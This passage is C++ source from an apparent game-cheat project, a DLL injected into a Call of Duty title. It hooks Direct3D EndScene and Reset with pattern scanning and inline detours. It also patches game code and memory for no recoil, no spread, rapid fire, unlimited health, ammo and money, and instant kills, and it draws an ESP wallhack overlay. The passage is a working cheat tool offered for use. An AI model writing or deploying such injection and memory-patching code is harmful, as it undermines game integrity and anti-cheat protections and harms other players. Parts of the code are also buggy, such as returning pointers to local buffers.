	dMenu.pFont->OnResetDevice();
	dMenu.pHeaderFont->OnResetDevice();
	return hRet;
}

HRESULT WINAPI EndScene(LPDIRECT3DDEVICE9 pDevice)
{
	ReFont(pDevice);
	dMenu.BuildMenu("Eidolon' D3D", 10, 0, 190, 200, GOLD, RED, BLACK, pDevice);
	return pEndScene(pDevice);
}

int D3Dinit(void)
{
	//Find D3D9.Direct3DCreate9EX
	//And extract the virtual call table 
	//In order to hook on the endscene and reset functions
	DWORD           hD3D, adr, *vtbl;
	do {
		hD3D = (DWORD)GetModuleHandle("d3d9.dll");
		Sleep(10);
	} while (!hD3D);

	adr = FindPattern(hD3D, 15, (PBYTE)"\xC7\x06\x00\x00\x00\x00\x89\x86\x00\x00\x00\x00\x89\x86", "xx????xx????xx");
	if (adr) {
		memcpy(&vtbl, (void *)(adr + 2), 4);
		pReset = (oReset)DetourFunction((PBYTE)vtbl[16], (PBYTE)Reset, 5);
		pEndScene = (oEndScene)DetourFunction((PBYTE)vtbl[42], (PBYTE)EndScene, 5);
	}
	return 0;
}

BOOL WINAPI DllMain(HMODULE hDll, DWORD dwReason, LPVOID lpReserved)
{
	DisableThreadLibraryCalls(hDll);
	if (dwReason == DLL_PROCESS_ATTACH)
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)D3Dinit, 0, 0, 0);
	return TRUE;
}
```

`Offsets menu/Classes.h`:

```h
#include "Addresses.h"
#pragma once

#define PI 3.14159265
#define stand	0x0
#define crouch	0x4
#define lay		0x8

typedef float vec_t;
typedef vec_t vec2_t[2];
typedef vec_t vec3_t[3];
typedef vec_t vec4_t[4];

typedef struct
{
	UINT NumVerticies;
	UINT PrimCount;
	UINT StartIndex;
} model_t;

class ScreenRes_t
{
public:
	__int32 iX;
	__int32 iY;
};//[Size=0x0008]

class PlayerActor_t
{
public:
	__int32 iServerTime; //0x0000 
	char _0x0004[24];
	vec3_t vOrigin; //0x001C 
	vec3_t vVelocity; //0x0028 
	char _0x0034[36];
	__int32 iGravity; //0x0058 
	__int32 iSpeed; //0x005C 
	char _0x0060[172];
	float vViewangles[2]; //0x010C 
	char _0x0114[4];
	__int32 iPlayerHeight; //0x0118 
	float flPlayerHeight; //0x011C 
	char _0x0120[64];
	__int32 iHealth; //0x0160 
	char _0x0164[4];
	__int32 iMaxHealth; //0x0168 
	char _0x016C[200];
	__int32 iSecWeaponID3; //0x0234 
	__int32 iOffhandID3; //0x0238 
	char _0x023C[4];
	__int32 iPriWeaponID3; //0x0240 
	char _0x0244[228];
	__int32 iTacticalEquipID; //0x0328 
	__int32 iTacticalEquipAmmo; //0x032C 
	__int32 iCurrentWeapon; //0x0330 
	char _0x0334[4];
	float flZoomFraction; //0x0338 
	float flCrosshairSpreadAdd; //0x033C 
	char _0x0340[20];
	__int32 iSecWeaponID2; //0x0354 
	__int32 iSecAmmoClip; //0x0358 
	__int32 iOffhandID2; //0x035C 
	char _0x0360[12];
	__int32 iPriWeaponID2; //0x036C 
	__int32 iPriAmmoClip; //0x0370 
	char _0x0374[88];
	__int32 iSecWeaponID1; //0x03CC 
	__int32 iSecAmmo; //0x03D0 
	__int32 iSecAkimboAmmo; //0x03D4 
	__int32 iOffhandID1; //0x03D8 
	__int32 iOffhandAmmo; //0x03DC 
	char _0x03E0[16];
	__int32 iPriWeaponID1; //0x03F0 
	__int32 iPriAmmo; //0x03F4 
	__int32 iPriAkimboAmmo; //0x03F8 
	char _0x03FC[4];
	__int32 iActionslot1; //0x0400 
	char _0x0404[332];

};//Size=0x0550

class entity_t
{
public:
	char unknown0[2]; //0x0000
	__int16 InfoValid; //0x0002  
	char unknown4[12]; //0x0004
	vec3_t vOrigin;
	char unknown28[4]; //0x001C
	float Angle; //0x0020  
	char unknown36[60]; //0x0024
	__int32 eFlag; //0x0060  
	__int32 eType; //0x0064  
	char unknown104[8]; //0x0068
	vec3_t vOrigin_old;
	char unknown124[12]; //0x007C
	__int32 eType2; //0x0088  
	char unknown140[8]; //0x008C
	float AngleX; //0x0094  
	float AngleY; //0x0098  
	char unknown156[60]; //0x009C
	__int32 eFlag2; //0x00D8  
	__int32 eType3; //0x00DC  
	char unknown224[8]; //0x00E0
	vec3_t vOrigin_old2;
	char unknown244[24]; //0x00F4
	float Angle2_x; //0x010C  
	float Angle2_y; //0x0110  
	char unknown276[52]; //0x0114
	__int32 Weapon; //0x0148  
	char unknown332[4]; //0x014C
	__int32 ClientNum; //0x0150  
	char unknown340[40]; //0x0154
	__int32 Valid2; //0x017C  
	char unknown384[1]; //0x0180
	__int8 Valid; //0x0181  
	char unknown386[18]; //0x0182
};//Size=0x0194

class TeamInfo_ptr
{
public:
	char _0x0000[4];
	__int32 iTeam; //0x0004 
	char _0x0008[120];
};//Size=0x0080

class client_t
{
public:
	__int16 iCurrentValid; //0x0000 
	char _0x0002[10];
	__int32 iPose; //0x000C 
	char _0x0010[12];
	vec3_t vOrigin; //0x001C 
	char _0x0028[24];
	vec3_t vAngles; //0x0040 
	char _0x004C[48];
	__int16 iCurrentWeapon; //0x007C 
	__int16 iClientNum; //0x007E 
	char _0x0080[84];
	vec3_t vViewOrigin; //0x00D4 
	char _0x00E0[12];
	vec3_t vOldOrigin; //0x00EC 
	char _0x00F8[20];
	PlayerActor_t* PlayerActor; //0x010C 
	char _0x0110[4];
	TeamInfo_ptr* TeamInfo; //0x0114 
	char _0x0118[44];
	__int32 iCommandCount; //0x0144 
	char _0x0148[8];
	__int32 iHealth; //0x0150 
	__int32 iMaxHealth; //0x0154 
	char _0x0158[284];

};//Size=0x0274

class CG_t
{
public:
	__int32 ClientNum;//0x0000
	char _0x0004[64];
	__int32 iVelocity; //0x0044 
	vec3_t vOrigin; //0x0048 
	vec3_t vVelocity; //0x0054 
	char _0x0060[216];
	float vViewAngles[2]; //0x0138 
	char _0x0140[548];
	float flZoomFraction; //0x0364 
	char _0x0368[216];
};//Size=0x0440

class RefDef_t
{
public:
	__int32 iX; //0x0000 
	__int32 iY; //0x0004 
	__int32 iWidth; //0x0008 
	__int32 iHeight; //0x000C 
	float flFovX; //0x0010 
	float flFovY; //0x0014 
	vec3_t vOrigin; //0x0018 
	vec3_t vViewAxis[3]; //0x0024 
	char _0x0048[4];
	vec3_t vOldOrigin; //0x004C 
	char _0x0058[100];
	char sz_pad[19068]; //0x00BC 
	float RefdefViewAngles[2]; //0x4B38 
};//Size=0x4B40

class viewAngles_t
{
public:
	char unknown0[52]; //0x0000
	float AngleX; //0x0034  
	float AngleY; //0x0038  
	char unknown60[28]; //0x003C
	float ViewAngleX; //0x0058  
	float ViewAngleY; //0x005C  
};

class ScreenPlacement_t
{
public:
	float scaleVirtualToReal[2];
	float scaleVirtualToFull[2];
	float scaleRealToVirtual[2];
	float virtualScreenOffsetX;
	float virtualViewableMin[2];
	float virtualViewableMax[2];
	float realViewportSize[2];
	float realViewableMin[2];
	float realViewableMax[2];
	float subScreenLeft;
};

class Weapon_t
{
public:
	char *szModel; //0x0000 
	char _0x0004[4];
	char *szLocalizedName; //0x0008 
	char _0x000C[60];
	float flZoomedFOV; //0x0048 
	char _0x004C[8];
	__int32 iMaxClipRounds; //0x0054 
	__int32 iBulletImpactEffectType; //0x0058 
	__int32 iWeaponFireDelay; //0x005C 
	__int32 iWeaponBulletType; //0x0060 
	char _0x0064[4];
	vec3_t vWeaponWeight; //0x0068 
	char _0x0074[16];
	__int32 Icon; //0x0084 
};

class trace_t //usually decent change between games, this one is for cod4
{
public:
	float fraction;
	float normal[3];
	int surfaceFlags;
	int contents;
	const char *material;
	int hitType;
	unsigned __int16 hitId;
	unsigned __int16 modelIndex;
	unsigned __int16 partName;
	unsigned __int16 partGroup;
	bool allsolid;
	bool startsolid;
	bool walkable;
}; 

class ammo_t
{
public:
	__int32 Primarystk; //0x0000 
	char _0x0004[20];
	__int32 Secondarystk; //0x0018 
	char _0x001C[92];
	__int32 Primaryclip; //0x0078 
	char _0x007C[8];
	__int32 Grenades; //0x0084 
	char _0x0088[8];
	__int32 Flashes; //0x0090 
	char _0x0094[8];
	__int32 SecondaryClip; //0x009C 
	char _0x00A0[8];
	__int32 C4; //0x00A8 
	char _0x00AC[8];
	__int32 Claymore; //0x00B4 
	__int32 akimbo2; //0x00B8
	char _0x00BC[4];
};//Size=0x0440

class w2s_t
{
public:
	char unknown[0xDC];
};

entity_t *GetEntityByIndex(int iIndex)
{
	return (entity_t *)(OFFS_Entity + (iIndex * SIZE_Entity));
}

client_t *GetClientByIndex(int iIndex)
{
	return (client_t *)(OFFS_Client + (iIndex * SIZE_Client));
}

entity_t *GetLocalEntity()
{
	return (entity_t *)(OFFS_Entity);
}

client_t *GetLocalClient()
{
	return (client_t *)(OFFS_Client);
}

CG_t * CG = (CG_t*)OFFS_CG;
ammo_t		* pLocalAmmo	= (ammo_t*)OFFS_Ammo;
RefDef_t	* RefDef	= (RefDef_t*)OFFS_RefDef;
viewAngles_t* ViewAngles= (viewAngles_t*)OFFS_ViewAngles;
ScreenRes_t	* ScreenRes = (ScreenRes_t*)OFFS_ScreenRes;
```

`Offsets menu/ColorDefinitions.h`:

```h
#define RED D3DCOLOR_ARGB(255, 255, 0, 0)
#define GREEN D3DCOLOR_ARGB(255, 0, 255, 0)
#define BLUE D3DCOLOR_ARGB(255, 0, 0, 255)
#define WHITE D3DCOLOR_ARGB(255, 255, 255, 255)
#define BLACK D3DCOLOR_ARGB(255, 0, 0, 0)
#define YELLOW D3DCOLOR_ARGB(255, 255, 255, 0)
#define ORANGE D3DCOLOR_ARGB(255, 255, 132, 0)
#define MAGENTA D3DCOLOR_ARGB(128,255,0,255)
#define GOLD D3DCOLOR_ARGB(255, 198, 147, 10)
#define GOLDEN D3DCOLOR_ARGB(255, 255, 215, 0)
#define MAROON D3DCOLOR_ARGB(255, 100, 0, 0)
```

`Offsets menu/Functions.h`:

```h
#include "SystemIncludes.h"
#include "Classes.h"
#pragma once
#pragma warning(disable:4244)
#pragma warning(disable:4996)
#pragma warning(disable:4172)
#pragma warning(disable:4715)
#pragma warning(disable:4309)
#pragma warning(disable:4101)
typedef bool(*World2Screen_)(int unknown, w2s_t * w2scalc, vec3_t vPoint, float Screen[2]);
World2Screen_ w2s = (World2Screen_)S_WORLDTOSCREEN;

typedef void(__cdecl *CG_Trace_t)(trace_t *, vec3_t, vec3_t, vec3_t, int, int);
CG_Trace_t CG_Trace = (CG_Trace_t)S_TRACE;

typedef w2s_t *(*Getw2s_t)();
Getw2s_t GetMatrix = (Getw2s_t)S_GETSCREENMATRIX;

typedef HRESULT(WINAPI* oReset)(LPDIRECT3DDEVICE9 pDevice, D3DPRESENT_PARAMETERS* pPresentationParameters);
typedef HRESULT(WINAPI* oEndScene)(LPDIRECT3DDEVICE9 pDevice);

vec3_t nullvec = { 0, 0, 0 };

void Trace(trace_t *t, vec3_t start, vec3_t end, int skip, int mask)
{
	CG_Trace(t, start, end, nullvec, skip, mask);
}

char * GetWeaponName(DWORD dwNum)
{
	return (char*)(*(DWORD*)((dwNum & 0xFF) * 4 + OFFS_WeaponName));
}

DWORD GetHPHeight(client_t * pClient, int h)
{
	return (h * (pClient->iHealth / pClient->iMaxHealth));
}

bool Visible(vec3_t point)
{
	trace_t t;
	Trace(&t, RefDef->vOrigin, point, CG->ClientNum, 0x803003);

	return (t.fraction >= 0.97f);
}

void PushCommandToConsole(char * szCommand)
{
	DWORD dwCall = S_PCTC;
	__asm
	{
		push szCommand;
		push 0;
		call dwCall;
		add esp, 0x8;
	}
}

DWORD AimAssistCall1(0x421b20);
DWORD AimAssistCall2(0x4ba870);
__declspec(naked) void AimAssist()
{
	__asm {
		movzx   ecx, word ptr[esi + 0x150]
			push    eax
			push    ecx
			call    AimAssistCall1
			add     esp, 8
			test    eax, eax
			jnz     loc_1
			retn
			loc_1 :
		mov     edx, [esp + 0x4]
			push    edx
			push    edi
			push    eax
			push    esi
			call    AimAssistCall2
			add     esp, 0x10
			test    eax, eax
			jnz     loc_2
			mov		eax, 0
			loc_2:
		mov     eax, 1
			retn
	}
}

void GetTagPos(entity_t * pEnt, WORD wBone, float * vOut)
{
	__asm {
		push vOut
			movzx edi, wBone
			mov esi, pEnt
			call AimAssist
			add esp, 0x4
	}
}

WORD RegisterTag(char * szBone)
{
	DWORD dwCall = S_REGTAG;
	__asm {
		push 1
			push szBone
			call[dwCall]
			add esp, 0x8
	}
}

char * Ch(int n)
{
	char a[32];
	sprintf(a, "%i", n);
	return a;
}

char * fCharize(float number)
{
	char c[20];
	sprintf(c, "%f", number);
	return c;
}

void Crosshair1(int mid, DWORD Color, LPDIRECT3DDEVICE9 pDevice)
{
	//DrawDot(0, mid-16, Color, 
}

void DrawLine(int x1, int y1, int x2, int y2, D3DCOLOR Color, LPD3DXLINE pLine, LPDIRECT3DDEVICE9 pDevice)
{
	D3DXCreateLine(pDevice, &pLine);
	D3DXVECTOR2 line[] = { D3DXVECTOR2(x1, y1), D3DXVECTOR2(x2, y2) };
	pLine->Begin();
	pLine->Draw(line, 2, Color);
	pLine->End();
	pLine->Release();
}

void PrintText(char pString[], int x, int y, D3DCOLOR col, ID3DXFont *font, bool Center = 0, int w = 500, int h = 30)
{
	RECT FontRect = { x, y, x + w, y + h };
	if (!Center)
		font->DrawText(NULL, pString, -1, &FontRect, DT_LEFT | DT_WORDBREAK, col);
	if (Center)
		font->DrawText(NULL, pString, -1, &FontRect, DT_CENTER, col);
}

void FillRGB(int x, int y, int w, int h, D3DCOLOR color, IDirect3DDevice9* pDevice)
{
	if (w < 0)w = 1;
	if (h < 0)h = 1;
	if (x < 0)x = 1;
	if (y < 0)y = 1;

	D3DRECT rec = { x, y, x + w, y + h };
	pDevice->Clear(1, &rec, D3DCLEAR_TARGET, color, 0, 0);
}

void DrawBorder(int x, int y, int w, int h, int px, D3DCOLOR BorderColor, IDirect3DDevice9* pDevice)
{
	FillRGB(x, (y + h - px), w, px, BorderColor, pDevice);
	FillRGB(x, y, px, h, BorderColor, pDevice);
	FillRGB(x, y, w, px, BorderColor, pDevice);
	FillRGB((x + w - px), y, px, h, BorderColor, pDevice);
}

void DrawBox(int x, int y, int w, int h, D3DCOLOR BoxColor, D3DCOLOR BorderColor, IDirect3DDevice9* pDevice)
{
	FillRGB(x, y, w, h, BoxColor, pDevice);
	DrawBorder(x, y, w, h, 1, BorderColor, pDevice);
}

void DrawDot(int x, int y, DWORD color, LPDIRECT3DDEVICE9 pDevice)
{
	D3DRECT rec = { x, y, x + 1, y + 1 };
	pDevice->Clear(1, &rec, D3DCLEAR_TARGET, color, 0, 0);
}

void DrawPoint(int x, int y, int w, int h, DWORD color, IDirect3DDevice9* pDevice)
{
	FillRGB((int)x, (int)y, (int)w, (int)h, color, pDevice);
}

void DrawCircle(int X, int Y, int radius, int numSides, DWORD Color, ID3DXLine * pLine)
{
	D3DXVECTOR2 Line[128];
	float Step = PI * 2.0 / numSides;
	int Count = 0;
	for (float a = 0; a < PI*2.0; a += Step)
	{
		float X1 = radius * cos(a) + X;
		float Y1 = radius * sin(a) + Y;
		float X2 = radius * cos(a + Step) + X;
		float Y2 = radius * sin(a + Step) + Y;
		Line[Count].x = X1;
		Line[Count].y = Y1;
		Line[Count + 1].x = X2;
		Line[Count + 1].y = Y2;
		Count += 2;
	}
	pLine->Begin();
	pLine->Draw(Line, Count, Color);
	pLine->End();
}

bool isMouseinRegion(int x1, int y1, int x2, int y2)
{
	POINT cPos;
	GetCursorPos(&cPos);
	if (cPos.x > x1 && cPos.x < x2 && cPos.y > y1 && cPos.y < y2) {
		return true;
	}
	else {
		return false;
	}
}

bool bCompare(const BYTE* pData, const BYTE* bMask, const char* szMask)
{
	for (; *szMask; ++szMask, ++pData, ++bMask)
		if (*szMask == 'x' && *pData != *bMask)
			return 0;
	return (*szMask) == NULL;
}

DWORD FindPattern(DWORD dwAddress, DWORD dwLen, BYTE *bMask, char * szMask)
{
	for (DWORD i = 0; i < dwLen; i++)
		if (bCompare((BYTE*)(dwAddress + i), bMask, szMask))
			return (DWORD)(dwAddress + i);
	return 0;
}

void *DetourFunction(BYTE *src, const BYTE *dst, const int len)
{
	BYTE *jmp = (BYTE*)malloc(len + 5);
	DWORD dwBack;

	VirtualProtect(src, len, PAGE_EXECUTE_READWRITE, &dwBack);
	memcpy(jmp, src, len);
	jmp += len;
	jmp[0] = 0xE9;
	*(DWORD*)(jmp + 1) = (DWORD)(src + len - jmp) - 5;
	src[0] = 0xE9;
	*(DWORD*)(src + 1) = (DWORD)(dst - src) - 5;
	for (int i = 5; i < len; i++)  src[i] = 0x90;
	VirtualProtect(src, len, dwBack, &dwBack);
	return (jmp - len);
}

void JMP(BYTE *pAddress, DWORD dwJumpTo, DWORD dwLen)
{
	DWORD dwOldProtect, dwBkup, dwRelAddr;

	VirtualProtect(pAddress, dwLen, PAGE_EXECUTE_READWRITE, &dwOldProtect);
	dwRelAddr = (DWORD)(dwJumpTo - (DWORD)pAddress) - 5;
	*pAddress = 0xE9;

	*((DWORD *)(pAddress + 0x1)) = dwRelAddr;
	for (DWORD x = 0x5; x < dwLen; x++) *(pAddress + x) = 0x90;
	VirtualProtect(pAddress, dwLen, dwOldProtect, &dwBkup);

	return;
}

DWORD Distance(vec3_t entity1, vec3_t entity2)
{
	float A, B;
	A = fabs(entity1[0] - entity2[0]);
	B = fabs(entity1[1] - entity2[1]);
	float C = sqrt(A*A + B*B);
	return floor(C / 10);
}
```

`Offsets menu/Hacks.h`:

```h
#pragma once
char rapidfireModValOn[2] = { 0xEB, 0x2C };
char rapidfireModValOff[2] = { 0x74, 0x14 };
trace_t t;

void noRecoil(int _switch)
{
	DWORD dwOld;
	VirtualProtect((PVOID)pNoRecoil, 0x1, PAGE_EXECUTE_READWRITE, &dwOld);
	_switch == 1 ? *(BYTE*)pNoRecoil = 0xC3 : *(BYTE*)pNoRecoil = 0x83;
	VirtualProtect((PVOID)pNoRecoil, 0x1, dwOld, &dwOld);
}

void noSpread(int _switch)
{
	DWORD dwOld;
	VirtualProtect((PVOID)pPerkCheck, 1, PAGE_EXECUTE_READWRITE, &dwOld);
	if(_switch == 1){
		*(BYTE*)pPerkCheck = 0x00;
		pNoSpread = 0.01f;}
	else
		*(BYTE*)pPerkCheck = 0x74;
	VirtualProtect((PVOID)pPerkCheck, 1, dwOld, &dwOld);
}

void CleanFloor(int _switch)
{
	_switch == 1 ? PushCommandToConsole("ai_corpseCount 0") : PushCommandToConsole("ai_corpseCount 30");
}

void UnlHealth(int _switch)
{
	if(_switch == 1){
		client_t * pLocalClient = GetLocalClient();
		if(pLocalClient->iHealth < 1000){
			pLocalClient->iHealth = 1000;
			pLocalClient->iMaxHealth = 1000;
		}
	}
}

void UnlAmmo(int _switch)
{
	if(_switch == 1){
		pLocalAmmo->Primaryclip = 100;
		pLocalAmmo->SecondaryClip  = 100;
		pLocalAmmo->C4 = 100;
		pLocalAmmo->Claymore = 100;
		pLocalAmmo->Grenades = 100;
		pLocalAmmo->Flashes = 100;
	}
}

void Superjump(int _switch)
{
	switch (_switch) {
	case 0: pJumpHeight = 39.0f;	break;
	case 1: pJumpHeight = 800.0f;	break;
	case 2: pJumpHeight = 2000.0f;	break;
	case 3: pJumpHeight = 4000.0f;	break;
	case 4: pJumpHeight = 8000.0f;	break;
	case 5: pJumpHeight = 10000.0f;	break;
	}
}

void Speed(int _switch)
{
	switch (_switch) {
	case 0: pSpeed = 190;  break;
	case 1: pSpeed = 400;  break;
	case 2: pSpeed = 800;  break;
	case 3: pSpeed = 2000; break;
	case 4: pSpeed = 4000; break;
	case 5: pSpeed = 5000; break;
	}
}

void AddMoney(int _switch)
{
	if(_switch == 1){
		int val, address;
		address = FindPattern(0x1A00000, 0x1BFFFF, (PBYTE)"\x00\x00\x00\x00\x00\x00\x06\xD7\x3E\x00", "??????xxxx");
		val = *(int*)address;
		*(int*)address = val + 10000;
}}

void FOV(int _switch)
{
	switch (_switch) {
	case 1: pFov = 80.0f;
	case 2: pFov = 100.0f;
	default: pFov = 65.0f;
	}
}

void TimeScale(int _switch)
{
	switch (_switch) {
	case 0: pTimeWarp = 0.2f;  break;
	case 1: pTimeWarp = 0.5f;  break;
	case 3: pTimeWarp = 1.5f;  break;
	case 4: pTimeWarp = 2.0f;  break;
	case 5: pTimeWarp = 3.0f;  break;
	default: pTimeWarp = 1.0f; break;
	}
}

void InstaKill(int _switch)
{
	for(int i = 0; i < 1024; i++){
		client_t * pLocalClient = GetLocalClient();
		client_t * pClient = GetClientByIndex(i);
		entity_t * pEntity = GetEntityByIndex(i);
		if((_switch == 1) && 
			(pEntity->eType == 1) &&
			(pEntity->Valid == 13) &&
			(pLocalClient->TeamInfo != pClient->TeamInfo) && 
			(pClient->iMaxHealth != 20761) && 
			(pClient->iMaxHealth != 9999) && 
			(pClient->iMaxHealth != 100))
			pClient->iHealth = 1;
	}
}

void RapidFire(int _switch)
{
	DWORD dwOld;
	VirtualProtect((PVOID)pRapidFire, 2, PAGE_EXECUTE_READWRITE, &dwOld);
	if(_switch == 1) {
		memcpy((void*)pRapidFire, &rapidfireModValOn, 2);
		pRfPerk = 0.01f;
	}
	else
		memcpy((void*)pRapidFire, &rapidfireModValOff, 2);
	VirtualProtect((PVOID)pRapidFire, 2, dwOld, &dwOld);
}

void ChaosMode(int _switch)
{
	if(_switch == 1){
		pEnableChaos = 1;
		pActivateChaos = 1;
	}
	else if(_switch == 0)
		pActivateChaos = 0;
	
	PushCommandToConsole("map_restart");
}

void InstantADS(int _switch)
{
	DWORD dwOld;
	VirtualProtect((PVOID)pPerkCheckADS, 0x1, PAGE_EXECUTE_READWRITE, &dwOld);
	if(_switch == 1)
	{
		pInstantADS = 5.f;
		*(BYTE*)pPerkCheckADS = 0x0;
	}
	else
	{
		pInstantADS = 1.5f;
		*(BYTE*)pPerkCheckADS = 0x10;
	}
	VirtualProtect((PVOID)pPerkCheckADS, 0x1, dwOld, &dwOld);
}

void ESP(int _switchESP, int MarkHead, int Weapons, int HP, int Lines, LPDIRECT3DDEVICE9 pDevice, LPD3DXFONT pFont, LPD3DXLINE pLine)
{if(IsInGame()){
	vec3_t vTarget, vOut;
	float fScreen[2], fScreen2[2], fScreen3[2], flOut[2];
	w2s_t * Matrix = GetMatrix();
	float x, y;
	DWORD width(2), COLOR;
	char a[32], b[32], c[32], d[32], e[32], f[32], g[32], h[32], i[32], j[32], k[32], l[32], m[32];

	for(int i = 0; i < 2048; i++)
	{
		client_t * pClient = GetClientByIndex(i);
		entity_t * pEntity = GetEntityByIndex(i);
		client_t * pLocalClient = GetLocalClient();
		entity_t * pLocalEntity = GetLocalEntity();
		
		if(_switchESP)
		{
			if((pEntity->eType == 1) && (pClient->iHealth > 0) && (pEntity->Valid == 13) && (pClient->vOrigin != pLocalClient->vOrigin))
			{
				WORD wHead = RegisterTag("j_head");
				GetTagPos(pEntity, wHead, vTarget);

				if((w2s(0, Matrix, vTarget, fScreen)) && (w2s(0, Matrix, pEntity->vOrigin, fScreen2))){
						if((fScreen2[0] < 1.f) || (fScreen2[1] < 1.f)) continue;

						if((pClient->iMaxHealth != 100) && (pClient->iMaxHealth != 20761))//if not dog / pavelow
						{ 
							//Draw settings
							if(pClient->TeamInfo->iTeam != pLocalClient->TeamInfo->iTeam){
								if(Visible(vTarget)) COLOR = RED; //If visible show brighter box
								else COLOR = MAROON;}
							else 
								COLOR = GREEN ;

							y = fScreen2[1] - fScreen[1];
						}

						if(y < 10.f) y = 10.f;
						x = y / 2.5f;

						//Boxes
						DrawBorder(fScreen[0]-(x/2), fScreen[1]-10.f,x,y+12.f, width, COLOR, pDevice);

						if(MarkHead){ //Cross head
							FillRGB(fScreen[0]-(x/2), fScreen[1], x, 1, COLOR, pDevice); //X line
							FillRGB(fScreen[0], fScreen[1], 1, y, COLOR, pDevice); //Y line
						}

						DWORD x1 = floor((ScreenRes->iX/2)/1.25);
						DWORD y1 = floor(ScreenRes->iY/1.25);

						if(Lines) //Draw Lines
							DrawLine(x1, y1, fScreen[0], fScreen2[1], COLOR, pLine, pDevice);

						if(HP) //Show Health
							DrawBorder(fScreen[0]-(x/2)-(width), fScreen[1]-10.f, 3, GetHPHeight(pClient, (y+10.f)), width, GREEN, pDevice);

						if(Weapons) //Show Weapon
							PrintText(GetWeaponName(pClient->iCurrentWeapon), fScreen[0]-(x/2)-(width), fScreen[1]-25.f, COLOR, pFont);
					}
				}
			}
		}
/*

		if(ShowItems)
		{
			float flOut[2];
			char* Item(nullptr);
			bool allow(false);

			if(pEntity->eType != 1)
				continue;

			if(pEntity->Valid == 5)
			{
				if(pEntity->eFlag == 1280)
					PrintText("Chopper", flOut[0]-10.f, flOut[1], ORANGE, pFont);
				else if(pEntity->eFlag == 48)
					PrintText("Gas", flOut[0]-10.f, flOut[1], ORANGE, pFont);
			}

			if(pEntity->Valid == 3)
			{
				if(pEntity->eType == 1)// || (pEntity->eType == 5))
				{
					if(pEntity->Weapon == 72)
					{
						Item = "Flash";
						PrintText("Flash", flOut[0]-10.f, flOut[1], ORANGE, pFont);
						allow = 1;
					}
					else if(pEntity->Weapon == 3)
					{
						Item = "Frag";
						PrintText("Frag", flOut[0]-10.f, flOut[1], ORANGE, pFont);
						allow = 1;
					}
				}
			}
		}*/
	}
}

void Aimbot(int Aimbot, int Triggerbot, vec3_t Target)
{
	if(IsInGame()){
		if(Aimbot){
			//TODO: Add aimbot

		}
	}
}

void Crosshair(int _switch)
{
	if(_switch != 0){

	}
}
```

`Offsets menu/Menu.cpp`:

```cpp
#include "Menu.h"
#include "ColorDefinitions.h"
#include "Hacks.h"
#pragma once

void Menu::CreateItem(char * title, int *toggle, HEADER *parentHeader, int hacktype)
{
	itemcount++;
	MENUITEM[itemcount].index = itemcount;
	MENUITEM[itemcount].title = title;
	MENUITEM[itemcount].toggle = toggle;
	MENUITEM[itemcount].hacktype = hacktype;
	MENUITEM[itemcount].parentHeader = parentHeader;
}

void Menu::CreateHeader(char * title, int *toggle, int items)
{

	CreateItem(title, toggle, 0, 99);

	headercount++;
	MENUHEADER[headercount].index = itemcount;
	MENUHEADER[headercount].title = title;
	MENUHEADER[headercount].toggle = toggle;
	MENUHEADER[headercount].items = items;

}

void Menu::BuildMenu(char * menuname, int x, int y, int h, int w, DWORD TITLECOL, DWORD BACKCOLOR, DWORD BORDERCOLOR, LPDIRECT3DDEVICE9 pDevice)
{
	if (GetAsyncKeyState(VK_INSERT) & 1)show = (!show);
	if (show) {

		CreateHeader("Player", &HPlayer, 8);
		if (HPlayer == 1)
		{
			CreateItem("Unl. Health", &iHealth, &MENUHEADER[1], 0);
			CreateItem("Unl. Ammo", &iAmmo, &MENUHEADER[1], 0);
			CreateItem("Rapid fire", &iRapidFire, &MENUHEADER[1], 0);
			CreateItem("Instant ADS", &iInstaADS, &MENUHEADER[1], 0);
			CreateItem("No Recoil", &iRecoil, &MENUHEADER[1], 0);
			CreateItem("No Spread", &iSpread, &MENUHEADER[1], 0);
			CreateItem("Super Jump", &iJump, &MENUHEADER[1], 1);
			CreateItem("Super Speed", &iSpeed, &MENUHEADER[1], 1);
			CreateItem("Add Money", &iMoney, &MENUHEADER[1], 0);
		}

		CreateHeader("System", &HSystem, 4);
		if (HPlayer == 1)
		{
			CreateItem("Clean Floor", &iFloor, &MENUHEADER[2], 0);
			CreateItem("FoV", &iFOV, &MENUHEADER[2], 2);
			CreateItem("Time Warp", &iTime, &MENUHEADER[2], 3);
			CreateItem("One shot kill", &iInstaKill, &MENUHEADER[2], 0);
			//TODO: Shoot Though Walls
			CreateItem("Chaos Mode", &iChaos, &MENUHEADER[2], 0);
		}

		CreateHeader("ESP", &HESP, 4);
		if (HPlayer == 1)
		{
			CreateItem("ESP", &iESP, &MENUHEADER[3], 0);
			CreateItem("Lines", &iELines, &MENUHEADER[3], 0);
			CreateItem("Mark Head", &iEHeads, &MENUHEADER[3], 0);
			CreateItem("Show Health", &iEHealth, &MENUHEADER[3], 0);
			CreateItem("Show Weapon", &iEWeapons, &MENUHEADER[3], 0);
		}

		// TODO: Implement aimbot+triggerbot
		//CreateHeader("Aimbot", &header4, 2);
		//if (header4 == 1)
		//{
		//	CreateItem("Aimbot", &iAimbot, &MENUHEADER[4], 0);
		//	CreateItem("Triggerbot", &iTriggerbot, &MENUHEADER[4], 0);
		//}

		char d[32], e[32], f[32], g[32], h[32];

		//ViewAngles debug
		sprintf(d, "%f", ViewAngles->AngleX);
		sprintf(e, "%f", ViewAngles->AngleY);
		PrintText(d, 50, 300, WHITE, pFont);
		PrintText(e, 50, 315, WHITE, pFont);

		//ViewAxis debug
		sprintf(f, "%f", RefDef->vViewAxis[0]);
		sprintf(g, "%f", RefDef->vViewAxis[1]);
		sprintf(h, "%f", RefDef->vViewAxis[2]);
		PrintText(f, 50, 350, BLUE, pFont);
		PrintText(g, 50, 365, BLUE, pFont);
		PrintText(h, 50, 380, BLUE, pFont);

		PrintMenu(pDevice, pFont, pHeaderFont);

		if (selector < 1)
			selector = 1;

		if (selector > itemcount)
			selector = 1;
	}
	//Draw
	DrawBox(0, y, 185, (itemcount + 1) * 15, BLACK, GOLD, pDevice);
	PrintText(menuname, 55, y, GOLD, pHeaderFont);
	
	//Update
	Navigation();
	Hacks(pDevice, pFont);
	itemcount = 0;
	headercount = 0;
}

void Menu::Navigation()
{
	//KEYPRESS UP
	if (GetAsyncKeyState(VK_UP) & 1) {
		if (selector > 1) {
			if ((MENUITEM[selector].toggle == 0) && (MENUITEM[selector].hacktype = 99))
				selector -= MENUITEM[selector].parentHeader->items;
			else
				selector--;
		}
		Sleep(100);
	}

	//KEYPRESS DOWN
	if (GetAsyncKeyState(VK_DOWN) & 1) {
		if (selector < itemcount) {
			if ((MENUITEM[selector].toggle == 0) && (MENUITEM[selector].hacktype = 99))
